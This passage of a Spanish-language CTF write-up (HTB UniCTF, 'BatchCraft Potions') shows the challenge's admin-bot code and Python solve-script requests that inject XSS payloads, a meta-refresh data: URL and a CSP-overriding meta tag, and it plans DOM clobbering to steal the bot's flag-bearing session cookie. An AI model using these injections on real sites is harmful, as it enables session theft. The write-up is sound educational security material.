<span class="mtk7 mtki">const</span><span class="mtk1"> JWTHelper </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'./helpers/JWTHelper'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk1">        </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'fs'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">readFileSync</span><span class="mtk1">(</span><span class="mtk4">'/flag.txt'</span><span class="mtk1">).</span><span class="mtk8">toString</span><span class="mtk1">();</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">browser_options</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk1">headless</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">executablePath</span><span class="mtk1">: </span><span class="mtk4">'/usr/bin/chromium-browser'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">args</span><span class="mtk1">: [</span>
<span class="mtk1">        </span><span class="mtk4">'--no-sandbox'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--disable-background-networking'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--disable-default-apps'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--disable-extensions'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--disable-gpu'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--disable-sync'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--disable-translate'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--hide-scrollbars'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--metrics-recording-only'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--mute-audio'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--no-first-run'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--safebrowsing-disable-auto-update'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'--js-flags=--noexpose_wasm,--jitless'</span>
<span class="mtk1">    ]</span>
<span class="mtk1">};</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">previewProduct</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">id</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> puppeteer.</span><span class="mtk8">launch</span><span class="mtk1">(</span><span class="mtk1">browser_options</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1">.</span><span class="mtk8">createIncognitoBrowserContext</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">newPage</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> JWTHelper.</span><span class="mtk8">sign</span><span class="mtk1">({ </span><span class="mtk1">username</span><span class="mtk1">: </span><span class="mtk4">'admin'</span><span class="mtk1">, </span><span class="mtk1">verified</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">, </span><span class="mtk1">flag</span><span class="mtk1">: </span><span class="mtk1">flag</span><span class="mtk1"> });</span>  

<span class="mtk1">        </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">setCookie</span><span class="mtk1">({</span>
<span class="mtk1">            </span><span class="mtk1">name</span><span class="mtk1">: </span><span class="mtk4">"session"</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk1">value</span><span class="mtk1">: </span><span class="mtk1">token</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk1">domain</span><span class="mtk1">: </span><span class="mtk4">"127.0.0.1"</span>
<span class="mtk1">        });</span>

<span class="mtk1">        </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">.</span><span class="mtk8">race</span><span class="mtk1">(</span>
<span class="mtk1">            [</span>
<span class="mtk1">                </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">goto</span><span class="mtk1">(</span><span class="mtk4">`</span><span class="mtk4 detected-link">http://127.0.0.1/products/preview/</span><span class="mtk5 detected-link">${</span><span class="mtk9 mtki detected-link">id</span><span class="mtk5 detected-link">}</span><span class="mtk4">`</span><span class="mtk1">, {</span>
<span class="mtk1">                    </span><span class="mtk1">waitUntil</span><span class="mtk1">: </span><span class="mtk4">'networkidle2'</span>
<span class="mtk1">                }),</span>
<span class="mtk1">                </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk7 mtki">function</span><span class="mtk1"> (</span><span class="mtk8">reject</span><span class="mtk1">) {</span>
<span class="mtk1">                    </span><span class="mtk7">setTimeout</span><span class="mtk1">(</span><span class="mtk7 mtki">function</span><span class="mtk1"> (){</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">();</span>
<span class="mtk1">                    }, </span><span class="mtk6">7000</span><span class="mtk1">);</span>
<span class="mtk1">                }),</span>
<span class="mtk1">            ]</span>
<span class="mtk1">        );</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">finally</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>
<span class="mtk1">};</span>

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> { </span><span class="mtk8">previewProduct</span><span class="mtk1"> };</span>
</code></pre></div><p>Cosas importantes aquí es que la <em>flag</em> se almacena en un <em>token</em> JWT, que es la <em>cookie</em> de sesión del <em>bot</em>. Otra cosa (o problema) relevante es que el <em>bot</em> usa Headless Chrome. Digo problema porque el XSS en la etiqueta <code>meta</code> solo funciona en Safari a día de hoy (más información en <a href="https://stackoverflow.com/questions/18947139/xss-in-meta-tag">stackoverflow.com</a>).</p><p>Podemos intentarlo por si acaso, pero Chrome bloqueará las URLs a <code>data:</code> y <code>javascript:</code>. Para eso, reutilicé el <em>script</em> de Python para enviar la petición con el <em>token</em> JWT verificado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">.</span><span class="mtk8">set</span><span class="mtk1">(</span><span class="mtk4">'session'</span><span class="mtk1">, </span><span class="mtk1">token</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">host</span><span class="mtk6">}</span><span class="mtk4">/api/products/add'</span><span class="mtk1">, </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'product_name'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_desc'</span><span class="mtk1">: </span><span class="mtk4">'''&lt;img src="x" onerror="alert(123)"&gt;'''</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_price'</span><span class="mtk1">: </span><span class="mtk4">'123'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_category'</span><span class="mtk1">: </span><span class="mtk4">'1'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_keywords'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_title'</span><span class="mtk1">: </span><span class="mtk4">'fdsa'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_desc'</span><span class="mtk1">: </span><span class="mtk4">'''0; data:text/html;base64,PHNjcmlwdD4gYWxlcnQoMT</span><span class="mtk4">IzKSA8L3NjcmlwdD4K" http-equiv="refresh'''</span><span class="mtk1">,</span>  
<span class="mtk1">    })</span>

<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">r.text</span><span class="mtk1">)</span>
</code></pre></div><p>Usando el código anterior, obtendremos un producto provisional en <code>id = 7</code>. Si abrimos el producto en Chrome (de la misma manera que lo hará el <em>bot</em>), tenemos este mensaje de error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM  
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM
{"message":"Potion added and being reviewed by admin!"}
</code></pre></div><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-8.png" alt="BatchCraft Potions 8"></p><p>Podemos confirmar que el <em>payload</em> en <code>product.product_desc</code> se sanitiza correctamente:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-9.png" alt="BatchCraft Potions 9"></p><p>Al principio, pensé que las URLs de <code>data:</code> y <code>javascript:</code> se estaban bloqueando debido al <em>Content Security Policy</em> (<code>script-src 'self' 'unsafe-inline'</code>). Dado que podemos usar etiquetas <code>meta</code>, podemos sobrescribir el <em>Content Security Policy</em> (CSP) y establecer una política que se ajuste a nuestras necesidades. Por ejemplo, podemos agregar la URL <code>data:</code> con <code>script-src 'self' 'unsafe-inline' data:</code>. Pero luego vi que era Chrome el que bloqueaba las peticiones, no el CSP.</p><p>Traté incluso de usar el protocolo <code>gopher://</code> para comunicarme de alguna manera con MySQL e intentar hacer algo útil. Pero nuevamente, Chrome ya no implementa este protocolo.</p><p>Resumiendo:</p><ul><li>Podemos agregar código HTML en <code>product_desc</code>, pero se sanitizará con <code>DOMPurify.sanitize</code></li><li>Podemos usar etiquetas <code>meta</code> para redefinir el CSP</li></ul><h3 id="dom-_clobbering_">DOM <em>Clobbering</em></h3><p>No hay una manera fácil de hacer XSS&mldr; Hay una técnica bastante inteligente que podemos usar como última baza en retos de XSS. Me refiero a DOM <em>Clobbering</em> (más información en <a href="https://portswigger.net/web-security/dom-based/dom-clobbering">portswigger.net</a>):</p><blockquote><p><em>DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where <a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a> is not possible, but you can control some HTML on a page where the attributes <code>id</code> or <code>name</code> are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.</em></p></blockquote><p>Otros buenos recursos relacionados con DOM <em>Clobbering</em> son: <a href="https://www.securebinary.in/blog/web/art-of-dom-clobbering">www.securebinary.in</a> and another post from <a href="https://portswigger.net/research/dom-clobbering-strikes-back">portswigger.net</a>.</p><h3 id="planeando-el-ataque">Planeando el ataque</h3><p>Para realizar la técnica DOM <em>Clobbering</em>, debemos encontrar un código JavaScript que use variables globales (desde el objeto <code>window</code>) y sobrescribirlas con el código HTML.</p><p>En <code>views/product.html</code> tenemos <code>static/js/global.js</code>, <code>static/js/product.js</code> (y luego jQuery y otras librerías externas):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/js/jquery.min.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/vendors/rpgui/rpgui.min.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>  
<span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/js/global.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/js/product.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
<span class="mtk1">  &lt;/</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
<span class="mtk1">&lt;/</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
</code></pre></div><ul><li><code>static/js/global.js</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">window</span><span class="mtk1">.potionTypes </span><span class="mtk5">=</span><span class="mtk1"> [</span>
<span class="mtk1">    {</span>
<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk6">1</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"name"</span><span class="mtk1">:</span><span class="mtk4">"Snake Charm"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"src"</span><span class="mtk1">:</span><span class="mtk4">"/static/images/snakecharm.jpg"</span>
<span class="mtk1">    },</span>
<span class="mtk1">    {</span>
<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk6">2</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"name"</span><span class="mtk1">:</span><span class="mtk4">"Fairy Dust"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"src"</span><span class="mtk1">:</span><span class="mtk4">"/static/images/fairydust.jpg"</span>
<span class="mtk1">    },</span>
<span class="mtk1">    {</span>
<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk6">3</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"name"</span><span class="mtk1">:</span><span class="mtk4">"Gemini Stone"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"src"</span><span class="mtk1">:</span><span class="mtk4">"/static/images/geministone.jpg"</span>
<span class="mtk1">    },</span>
<span class="mtk1">    {</span>
<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk6">4</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"name"</span><span class="mtk1">:</span><span class="mtk4">"Fire Born"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"src"</span><span class="mtk1">:</span><span class="mtk4">"/static/images/fireborn.jpg"</span>
<span class="mtk1">    },</span>
<span class="mtk1">    {</span>
<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk6">5</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"name"</span><span class="mtk1">:</span><span class="mtk4">"Dragon Breath"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"src"</span><span class="mtk1">:</span><span class="mtk4">"/static/images/dragonbreath.jpg"</span>  
<span class="mtk1">    },</span>
<span class="mtk1">    {</span>
<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk6">6</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"name"</span><span class="mtk1">:</span><span class="mtk4">"Dark Spell"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"src"</span><span class="mtk1">:</span><span class="mtk4">"/static/images/darkspell.jpg"</span>
<span class="mtk1">    }</span>
<span class="mtk1">]</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">showToast</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">msg</span><span class="mtk1">, </span><span class="mtk9 mtki">fixed</span><span class="mtk5">=</span><span class="mtk6">false</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#globalToast'</span><span class="mtk1">).</span><span class="mtk8">hide</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#globalToast'</span><span class="mtk1">).</span><span class="mtk8">show</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#globalToastMsg'</span><span class="mtk1">).</span><span class="mtk8">text</span><span class="mtk1">(</span><span class="mtk9 mtki">msg</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">fixed</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk7">setTimeout</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#globalToast'</span><span class="mtk1">).</span><span class="mtk8">hide</span><span class="mtk1">();</span>
<span class="mtk1">        }, </span><span class="mtk6">2500</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><ul><li><code>static/js/product.js</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk1">document</span><span class="mtk1">).</span><span class="mtk8">ready</span><span class="mtk1">(</span><span class="mtk7 mtki">function</span><span class="mtk1">(){</span>
<span class="mtk1">    </span><span class="mtk8">loadPotionImage</span><span class="mtk1">();</span>

<span class="mtk1">})</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">loadPotionImage</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">product</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'.potion-item'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> potionTypes.length; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">product</span><span class="mtk1">.</span><span class="mtk8">data</span><span class="mtk1">(</span><span class="mtk4">'category'</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> potionTypes[i].id) {</span>
<span class="mtk1">            </span><span class="mtk1">product</span><span class="mtk1">.</span><span class="mtk8">prepend</span><span class="mtk1">(</span><span class="mtk4">`&lt;p class='reset-pos rpgui-container framed-golden</span><span class="mtk4">-2'&gt;Potion Type: </span><span class="mtk5">${</span><span class="mtk1">potionTypes[i].name</span><span class="mtk5">}</span><span class="mtk4">&lt;/p&gt;`</span><span class="mtk1">);</span>  
<span class="mtk1">            </span><span class="mtk1">product</span><span class="mtk1">.</span><span class="mtk8">prepend</span><span class="mtk1">(</span><span class="mtk4">`&lt;img src='</span><span class="mtk5">${</span><span class="mtk1">potionTypes[i].src</span><span class="mtk5">}</span><span class="mtk4">' class='category-img'&gt;`</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Después de leer sobre DOM <em>Clobbering</em>, está bastante claro que necesitamos controlar <code>window.potionTypes</code>. Sin embargo, debemos decirle al navegador que no cargue <code>static/js/global.js</code>&mldr;</p><p>Aquí viene el hecho de que podemos actualizar el CSP, por lo que podamos poner algo como:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">script-src 'unsafe-inline' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js  
</code></pre></div><p>De esa manera, solo se permitirá <code>static/js/product.js</code> y jQuery (<code>static/js/global.js</code> se bloqueará). Vamos a intentarlo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">host</span><span class="mtk6">}</span><span class="mtk4">/api/products/add'</span><span class="mtk1">, </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'product_name'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_desc'</span><span class="mtk1">: </span><span class="mtk4">'''&lt;img src="x" onerror="alert(123)"&gt;'''</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_price'</span><span class="mtk1">: </span><span class="mtk4">'123'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_category'</span><span class="mtk1">: </span><span class="mtk4">'1'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_keywords'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_title'</span><span class="mtk1">: </span><span class="mtk4">'fdsa'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_desc'</span><span class="mtk1">: </span><span class="mtk4">'''script-src 'unsafe-inline' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js" http-equiv="Content-Security-Policy'''</span><span class="mtk1">,</span>  
<span class="mtk1">    })</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM  
{"message":"Potion added and being reviewed by admin!"}
</code></pre></div><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-10.png" alt="BatchCraft Potions 10"></p><p>Esto no funciona como se esperaba porque estamos accediendo desde <code>127.0.0.1:1337</code> y no desde <code>127.0.0.1</code> (puerto 80). Podemos cambiarlo para ver que debería funcionar:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-11.png" alt="BatchCraft Potions 11"></p><p>Ahí lo tenemos: <code>static/js/global.js</code> está bloqueado y <code>potionTypes</code> está indefinido.</p><p>Echemos otro vistazo a <code>static/js/product.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk1">document</span><span class="mtk1">).</span><span class="mtk8">ready</span><span class="mtk1">(</span><span class="mtk7 mtki">function</span><span class="mtk1">(){</span>
<span class="mtk1">    </span><span class="mtk8">loadPotionImage</span><span class="mtk1">();</span>

<span class="mtk1">})</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">loadPotionImage</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">product</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'.potion-item'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> potionTypes.length; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">product</span><span class="mtk1">.</span><span class="mtk8">data</span><span class="mtk1">(</span><span class="mtk4">'category'</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> potionTypes[i].id) {</span>
<span class="mtk1">            </span><span class="mtk1">product</span><span class="mtk1">.</span><span class="mtk8">prepend</span><span class="mtk1">(</span><span class="mtk4">`&lt;p class='reset-pos rpgui-container framed-golden</span><span class="mtk4">-2'&gt;Potion Type: </span><span class="mtk5">${</span><span class="mtk1">potionTypes[i].name</span><span class="mtk5">}</span><span class="mtk4">&lt;/p&gt;`</span><span class="mtk1">);</span>  
<span class="mtk1">            </span><span class="mtk1">product</span><span class="mtk1">.</span><span class="mtk8">prepend</span><span class="mtk1">(</span><span class="mtk4">`&lt;img src='</span><span class="mtk5">${</span><span class="mtk1">potionTypes[i].src</span><span class="mtk5">}</span><span class="mtk4">' class='category-img'&gt;`</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Está seleccionando elementos HTML que tienen la clase <code>potion-item</code> y poniendo contenido de HTML delante si <code>data-category</code> es igual a <code>potionTypes[i].id</code>.</p><p>Vayamos paso a paso. Este es un ataque básico de DOM <em>Clobbering</em>:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-12.png" alt="BatchCraft Potions 12"></p><p>Sin embargo, <code>potionTypes.length</code> está indefinido. Podemos superar esto agregando más elementos HTML con <code>id="potionTypes"</code>:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-13.png" alt="BatchCraft Potions 13"></p><p>Vemos que <code>potionTypes[i].id = 'potionTypes'</code>, y <code>product.data('category')</code> será un número entero porque <code>Joi</code> lo comprueba:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"potion-item"</span><span 